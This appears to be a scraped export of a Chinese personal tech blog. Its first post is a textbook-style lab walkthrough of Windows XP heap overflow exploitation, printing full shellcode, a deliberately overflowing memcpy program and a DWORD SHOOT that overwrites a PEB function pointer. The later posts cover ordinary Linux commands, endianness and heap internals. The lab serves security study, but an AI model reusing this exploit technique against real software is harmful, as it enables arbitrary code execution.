\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;;//200 bytes 0x90/*char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block&quot;\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f&quot;;//0x00360688 is the address of shellcode in first heap block //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()//and will be called by ExitProcess() at last*//*char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;//repaire the pointer which shooted by heap over run&quot;\\xB8\\x20\\xF0\\xFD\\x7F&quot; //MOV EAX,7FFDF020&quot;\\xBB\\x60\\x20\\xF8\\x77&quot; //MOV EBX,77F8AA4C the address here may releated to your OS&quot;\\x89\\x18&quot; //MOV DWORD PTR DS:[EAX],EBX&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block&quot;\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f&quot;;//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()//and will be called by ExitProcess() at last*/main()&#123; HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); //__asm int 3 //used to break the process //memcpy(h1,shellcode,200); //normal cpy, used to watch the heap memcpy(h1,shellcode,0x200); //overflow,0x200=512 h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); return 0;&#125; 先简单地解释一下程序和实验步骤。 （1） h1 向堆中申请了 200 字节的空间。 （2） memcpy 的上限错误地写成了0x200，这实际上是 512 字节，所以会产生溢出。 （3） h1 分配完之后，后边紧接着的是一个大空闲块（尾块）。 （4）超过 200 字节的数据将覆盖尾块的块首。 （5）用伪造的指针覆盖尾块块首中的空表指针，当 h2 分配时，将导致 DWORD SHOOT。 123456789DWORD SHOOT 详细过程第一次链表分配(h1):先向后遍历找到最大堆块，进行比较，然后再正向遍历，找到最小的符合要求的堆块。这里只有尾块，所以先分割尾块进行分配。先把尾块划分成两部分，然后修改两个块首大小信息，尾块指针复制到指定位置，然后回到空表freelist[0]，修改空表指针。缓冲区溢出，修改尾块的前驱后继指针第二次链表分配(h2):通过空表找到尾块，然后分割尾块，修改块首大小信息，复制尾块指针到指定位置，然后原本是通过后继指针回到freelist[0]，但是后继指针被覆盖，Node-&gt;blink(fake)指向了目标位置（target），然后用Node-&gt;flink(fake)修改了目标位置的内容。 （6） DWORD SHOOT 的目标是 0x7FFDF020 处的 RtlEnterCriticalSection()函数指针，可以简单地将其直接修改为 shellcode 的位置。 （7） DWORD SHOOT 完毕后，堆溢出导致异常，最终将调用 ExitProcess()结束进程。 （8） ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从 P.E.B 中拿出了指向 shellcode 的指针，因此 shellcode 被执行。 为了能够调试真实的堆状态，我们在代码中手动加入了一个断点： 1__asm int 3 依然是直接运行.exe 文件，在断点将进程中断时，再把调试器 attach 上。 我们先向堆中复制 200 个 0x90 字节，看看堆中的情况是否与预测一致，如下图，与我们分析一致，200字节后就是尾块 缓冲区布置如下: （1）将我们那段 168 字节的 shellcode 用 0x90 字节补充为 200 字节。 （2）紧随其后，附上 8 字节的块首信息。为了防止在 DWORD SHOOT 发生之前产生异常，不妨直接将块首从内存中复制使用： “\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00”。 （3）前向指针**( flink )是 DWORD SHOOT 的“子弹”，这里直接使用 shellcode 的起始地址0x00360688。 （4）后向指针( blink )**是 DWORD SHOOT 的“目标”，这里填入 P.E.B 中的函数指针地址 0x7FFDF020。 **注意：**shellcode 的起始地址 0x00360688需要在调试时确定。有时，HeapCreat()函数创建的堆区起始位置会发生变化。 这时，缓冲区内容如下： 12345678910111213141516char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block&quot;\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f&quot;; 运行一下，发现那个 failwest 消息框没有弹出来。原来，这里有一个问题： **被我们修改的 P.E.B 里的函数指针不光会被 ExitProcess()调用， shellcode 中的函数也会使用。**当 shellcode 的函数使用临界区时，会像 ExitProcess()一样被骗。 为了解决这个问题，我们对 shellcode 稍加修改，在一开始就把我们 DWORD SHOOT 的指针修复回去，以防出错。重新调试一遍，记下 0x7FFDF020 处的函数指针为 0x77F82060。 提示： P.E.B 中存放 RtlEnterCriticalSection() 函数指针的位置 0x7FFDF020 是固定的，但是， RtlEnterCriticalSection() 的地址也就是这个指针的值 0x77F82060 有可能会因为补丁和操作系统而不一样，请在动态调试时确定。 指令与对应机器码 指 令 机 器 码 MOV EAX,7FFDF020 “\\xB8\\x20\\xF0\\xFD\\x7F” MOV EBX,77F82060（可能需要调试确定这个地址） “\\xBB\\x60\\x20\\xF8\\x77” MOV [EAX],EBX “\\x89\\x18” 将这 3 条指令的机器码放在 shellcode 之前，重新调整 shellcode 的长度为 200 字节，然后是 8 字节块首， 8 字节伪造的指针。 这时，缓冲区内容如下： 12345678910111213141516171819202122232425char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;//repaire the pointer which shooted by heap over run&quot;\\xB8\\x20\\xF0\\xFD\\x7F&quot; //MOV EAX,7FFDF020&quot;\\xBB\\x60\\x20\\xF8\\x77&quot; //MOV EBX,77F8AA4C the address here may releated to your OS&quot;\\x89\\x18&quot; //MOV DWORD PTR DS:[EAX],EBX&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block&quot;\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f&quot;;/*//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug //0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()//and will be called by ExitProcess() at last*/ 现在把断点注释掉，build直接运行。结果如下图所示，注入成功！！！ 堆溢出利用的注意事项 调试堆与常态堆的区别 （1）调试堆不使用快表，只用空表分配。 （2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。 （3）块首的标志位不同。 在 shellcode 中修复环境 比较简单修复堆区的做法包括如下步骤。 （1）在堆区偏移 0x28的地方存放着堆区所有空闲块的总和 TotalFreeSize。 （2）把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量的大小(TotalFreeSize）。 （3）把该块的 flag 位设置为 0x10（last entry 尾块）。 （4）把 freelist[0]的前向指针和后向指针都指向这个堆块。 这样可以使整个堆区“看起来好像是”刚初始化完只有一个大块的样子，不但可以继续完成分配工作，还保护了堆中已有的数据。 定位 shellcode 的跳板 可以使用几种指令作为跳板定位 shellcode，这些指令一般可以在 netapi32.dll、 user32.dll、 rp crt4.dll 中搜到不少，代码如下所示。 123CALL DWORD PTR [EDI+0x78]CALL DWORD PTR [ESI+0x4C]CALL DWORD PTR [EBP+0x74] DWORD SHOOT 后的“指针反射”现象 回顾前面介绍 DWORD SHOOT 时所举的例子： 123456int remove (ListNode * node)&#123; node -&gt; blink -&gt; flink = node -&gt; flink; node -&gt; flink -&gt; blink = node -&gt; blink; return 0;&#125; 其中， node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake); 将会导致 DWORD SHOOT。你可能会发现node -&gt; flink(fake) -&gt; blink = node -&gt; blink(fake); 也能导致 DWORD SHOOT。这次 DWORD SHOOT 将把目标地址写回 shellcode 起始位置偏移 4 个字节的地方。我把类似这样的第二次 DWORD SHOOT 称为 “指针反射”。 有时在指针反射发生前就会产生异常。然而，大多数情况下，指针反射是会发生的，糟糕的是，它会把目标地址刚好写进 shellcode 中。这对于没有跳板直接利用 DWORD SHOOT 劫持进程的 exploit 来说是一个很大的限制，因为它将破坏 4 个字节的 shellcode。 幸运的是，很多情况下 4 个字节的目标地址都会被处理器当做“无关痛痒”的指令安全地执行过去。 参考： 《0day,软件安全漏洞分析技术》","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://www.rgzzplus.com/tags/%E5%A0%86/"}]},{"title":"使用linux时的问题总结","slug":"使用linux时的问题总结","date":"2022-04-10T06:39:47.000Z","updated":"2022-08-01T10:31:12.434Z","comments":true,"path":"2022/04/10/使用linux时的问题总结/","link":"","permalink":"https://www.rgzzplus.com/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"","text":"[TOC] vim /etc 写入时 出现 E121:无法打开并写入文件 解决方案： 保存的时候用:w !sudo tee % 输入密码，即可 安装中文输入法 安装步骤 1.更新源文件，使用的是阿里云源 打开sources.list文件 1leafpad /etc/apt/sources.list 复制源地址到文本中 12deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib 更新安装源 1apt-get update 2.下载IBus完后重启系统 123apt-get install ibusapt-get install ibus-pinyinreboot //重启 3.IBus配置 鼠标右键选择设置(setting)&gt;区域和语言(Region&amp;Language),在输入源中添加汉语（PinYin），可通过搜索PinYin找到。 Linux 编程 gcc 多线程编译失败 今天写一个线程的程序，已经在c文件中包含了线程的头文件&lt;pthread.h&gt;，可是编译的时候却报错“对pthread_create未定义的引用“，原来时因为 pthread库不是Linux系统默认的库，连接时需要使用库libpthread.a,所以在使用pthread_create创建线程时，在编译中要加-lpthread参数:gcc createThread.c -lpthread -o createThread. 加上这个以后编译成功！ 12345678910111213141516&#123;//线程创建相关函数pthread_t tid; //创建线程 IDpthread_create(&amp;tid, NULL, threadFunc, NULL);/* 线程创建函数，参数列表: 1. 线程 ID 地址 2. 线程 属性 3. 线程 函数地址 4. 线程 传递给线程函数的参数*/pthread_join(tid, NULL); //等待指定的线程结束&#125; 1234567891011121314151617181920212223#include&lt;time.h&gt;&#123;//统计程序运行时间 clock_t start,delta; double time_used; //程序开头加上这两行代码 /* 程序变量在这里定义 */ start = clock(); /* 程序执行代码放在这里 */ delta = clock() - start; printf(&quot;The time taken in total : %lf seconds\\n&quot;,(double)delta/CLOCKS_PER_SEC); //程序末尾输出运行时间 return 0;&#125;//统计程序时间，除了在代码中统计外，还能再运行程序前加上 [time ./程序名] ,让系统去统计 互斥锁 信号量 参考：《操作系统原理及Linux实践》","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"linux问题","slug":"linux问题","permalink":"https://www.rgzzplus.com/tags/linux%E9%97%AE%E9%A2%98/"}]},{"title":"linux命令行","slug":"linux命令行","date":"2022-04-10T06:37:19.000Z","updated":"2022-08-01T11:19:21.898Z","comments":true,"path":"2022/04/10/linux命令行/","link":"","permalink":"https://www.rgzzplus.com/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/","excerpt":"","text":"[toc] apt 软件包管理服务 apt命令负责安装，更新，删除和管理基于Ubuntu和Debian的系统的软件包。 安装软件包 12 sudo apt install [package name1] [package-name2] [package-name3] 卸载软件包 这是使用apt命令从我们的系统中删除程序或服务的语法。 12 sudo apt remove [package name] 但是，即使已删除软件包，在安装的软件包中也会有一些孤立的文件。 在这种情况下，您可以使用“清除清除”选项。 12 sudo apt --purge remove [package-name] 自动删除孤立的软件包 删除软件包时，仅删除关键的依赖项。 其余的留在我们的系统中 12 sudo apt autoremove 上面的命令将从系统中卸载所有孤立的软件包。 这包括已安装为依赖项且不再需要的任何软件包。 更新APT存储库 12 sudo apt update 它检查在线存储库，并将所有更新的软件包下载到本地存储库。 升级系统软件包 12 sudo apt upgrade 这将扫描系统上所有已安装的软件包，并找到在旧版本上运行的程序或服务。 接下来，它将所有此类程序和服务升级到最新的可用版本。 这是必不可少的命令，因为它使您可以使用单个命令来启动系统范围的升级。 但是上面的命令只会升级非关键软件包。 如果有可用的内核更新，则需要使用以下命令执行完整的系统升级： 12 sudo apt full-upgrade 上面的命令将升级Linux内核以及所有未使用先前命令升级的系统关键软件包。 全面升级后，通常需要重新启动，以便启动新内核。 搜索包 apt search命令是用于在Ubuntu上搜索软件包的最常用命令。 它旨在搜索包名称及其元数据，例如描述，依赖项，源和版本。 该命令返回名称或元数据与指定搜索关键字匹配的所有软件包。 以下是使用apt search命令搜索软件包的语法。 1sudo apt search [keyword] 探索 Linux 系统 选项与参数 大多数命令格式： 1command -options arguments -options -l 用于产生长格式的输出结果 -t 用于按修改时间顺序对输出结果排序 –reverse 以降序排列输出结果 显示当前工作目录名称 1pwd 更改当前工作目录 1cd [绝对路径/相对路径] 列出目录内容 1ls ls 命令选项 进一步了解长格式 ls -l 后的输出 不同字段的含义： 使用 file 命令确定文件类型 1file filename 使用 less 命令查看文本文件 less 命令进入文本后常用命令 复制粘贴技巧 使用鼠标，双击可以复制文件名，单击中键可以将其粘贴到命令中。 符号链接 第一个字母是 L ，表示一种特殊的文件叫符号链接（也叫软链接），在Unix中，一个文件可以被多个名称引用。 操作文件和目录 通配符 通配符，帮助快速指定一组文件名。 mkdir—创建目录 1mkdir directory... cp—复制文件和目录 将单个文件或目录 item1 复制到文件或目录 item2 1cp item1 item2 将多个文件或目录 item 复制到目录 directoty 中 1cp item... directory 有用的选项和示例 mv—移动和重命名文件 将文件或目录 item1 移动或重命名为 item2 1mv item1 item2 将一个或多个 item 从一个目录移动到另一个目录 1mv item... directory 未完待续。。。 参考：《linux命令行大全》 第二版","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"linux命令行大全","slug":"linux命令行大全","permalink":"https://www.rgzzplus.com/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/"}]},{"title":"内存的大小端问题","slug":"内存的大小端问题","date":"2022-04-10T06:28:47.000Z","updated":"2022-04-10T06:31:46.423Z","comments":true,"path":"2022/04/10/内存的大小端问题/","link":"","permalink":"https://www.rgzzplus.com/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/","excerpt":"","text":"大小端问题，也就是寻址和字节存储顺序问题 大端法 (big endian )：最高有效字节在最前面 小端法 (little endian )：最低有效字节在最前面 如果我们从左向右读字符，并且内存增加方向也随着向右增大，那么大端法存储与我们读的顺序一致，如下图 大多数Intel兼容机都只用小端模式。 参考：《深入理解计算机系统》","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"内存大小端","slug":"内存大小端","permalink":"https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/"}]},{"title":"堆的工作原理","slug":"堆的工作原理","date":"2022-04-10T06:27:47.000Z","updated":"2022-08-01T10:29:25.236Z","comments":true,"path":"2022/04/10/堆的工作原理/","link":"","permalink":"https://www.rgzzplus.com/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"[TOC] PS：如果您熟悉堆的工作原理，建议您跳过堆的介绍部分，直接看堆溢出原理 堆的工作原理 堆与栈的区别 1、栈 (stack) ，是一种在程序设计时就规定好大小及使用方式的内存，由操作系统自动分配释放，用于存放函数的参数值、局部变量等。栈总是成“线性”变化。栈向低地址空间增长。 2、堆 (heap)，是一种在程序运行时动态分配的内存，由开发人员分配和释放，若开发人员不释放，程序结束时由OS回收，分配方式类似于链表。堆向高地址增长。 下图是经典的32位系统内存布局，暂时我们只需要记住栈和堆的增长方向即可，后面实验部分会用到。 堆内存 栈内存 典型用例 动态增长的链表等数据结构 函数局部数据 申请方式 函数申请，通过返回指针使用，如 p = malloc(8); 程序中直接声名，如 char buffer[8]; 释放方式 需要指针传给专用的释放函数，如 free 函数返回时，由系统自动回收 管理方式 需要程序员处理申请与释放 申请后直接使用，申请与释放由系统自动完成，最后到达栈区平衡 所处位置 变化范围很大 0x0012XXXX 增长方向 由内存低地址向高地址排列（不考虑碎片等情况） 由内存高址向低址增加 堆的数据结构与管理策略 程序员使用堆只做三件事： 申请一定大小的内存 使用内存 释放内存 堆管理系统响应申请，就意味着要在 “`杂乱无章[1]]” 的内存中 “辨识[2]” 出空闲的内存，“寻找” 一片 “恰当[3]” 的空闲内存区域，以指针的形式返回给程序。 堆表：堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构,用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。 堆块：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首位于一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。 堆的内存组织如下图： 在 Windows 中，占用态[4]的堆块被使用它的程序索引，而堆表只索引所有 空闲态[5] 的堆块。 堆表 堆表的实现 在 Windows 中，堆表实现方法两种：空闲双向链表 Free list（简称空表）和快速单向链表 Look aside（简称快表） 空闲双向链表（空表） 堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用双向链表组织一条空表,如下图。 空表索引的第二项（free[1]）链接了堆中所有大小为8字节的空闲堆块，之后每个索引项链接的空闲堆块大小递增8字节，例如，free[2]链接大小为16字节的空闲堆块，free[3]链接大小为24字节的空闲堆块，free[127]标识大小为1016字节的空闲堆块。因此有： 空闲堆块的大小＝索引项（ID）×8（字节） 空表索引的第一项（free[0]）所标识的空表相对比较特殊。这条双向链表链接了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去.把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索。 快速单向表（快表） 快表是 Windows 用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并,快表也有128条，组织结构与空表类似,只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。 快表结构： 堆中的操作 堆中的操作分为三种：堆块分配，堆块释放，堆块合并。（其中 “分配” 和 “释放” 是在程序提交申请时执行的，而堆块合并是由堆管理系统自动完成） 堆块分配 堆块分配分为三类： 快表分配：找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用； 普通空表分配： 首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配[6]，即最小的能够满足要求的空闲块； 零号空表（free[0]）：先从 free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配。 堆块释放 释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也先从堆表末尾拿。快表最多只有4项 堆块合并 条件：当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。 堆块合并将两个块从空闲链表中 “卸下”、合并堆块、调整合并后大块的块首信息（如大小等）、将新块重新链入空闲链表。 堆块 根据堆块是否被占用分为占用态堆块和空闲态堆块。 占用态堆块的数据结构如下： 空闲态堆块的数据结构如下： 对比上面两图可知，空闲态堆块和占用态堆块的块首结构基本一致。相对于占用态的堆块来说，空闲态堆块的块首后8个字节存放了两个指针地址，分别指向前驱堆块和后驱堆块。 Self Size：块整体的大小，包括块首和块身 Previous chunk size：前一个块的大小 Segment Index：段索引 Flags：标志位，用于标志块的状态，即空闲态/占用态 Unused bytes：未被使用的字节大小 Tag index(Debug)： Flink in freelist：（Forward Link）指向下一个节点 Blink in freelist：（Backward Link）指向前一个节点 单链表和双链表 LIST_ENTRY 结构 (ntdef.h) 在堆中漫游 堆分配函数之间的调用关系 Windows 堆分配的 API 调用关系 所有的堆分配函数最终都将使用位于 ntdll.dll 中的 RtlAllocateHeap() 函数进行分配。 堆的调试方法 实验环境 备注 操作系统 windows xp sp3虚拟机 分配策略对操作系统很敏感 编译器 Visrual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 如果使用 debug 版本，实验将会失败 实验代码 12345678910111213141516171819202122232425#include &lt;windows.h&gt;main()&#123; HLOCAL h1,h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000);//Create a heap of specified size __asm int 3 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,6); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,19); h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24); //free block and prevent coaleses HeapFree(hp,0,h1); //free to freelist[2] 